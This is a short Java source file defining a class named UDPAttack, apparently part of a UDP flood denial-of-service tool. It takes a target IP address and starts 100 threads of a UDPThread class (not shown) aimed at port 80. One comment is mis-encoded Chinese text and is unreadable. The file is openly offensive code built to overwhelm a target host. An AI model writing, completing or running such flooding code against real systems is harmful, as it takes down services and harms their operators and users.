import java.net.*;
public class UDPAttack
{
    public String ip;
    public UDPThread ut;
    public UDPAttack(String ip)
    {
        this.ip=ip;
    }
    public void start() throws Exception
    {
        int threadc = 100;

        ut=new UDPThread(InetAddress.getByName(ip),80);//3600Îª360°²È«ÎÀÊ¿µÄ¶Ë¿Ú
        for(int i=1;i<=threadc;i++)
        {
            new Thread(ut).start();
        }
    }
}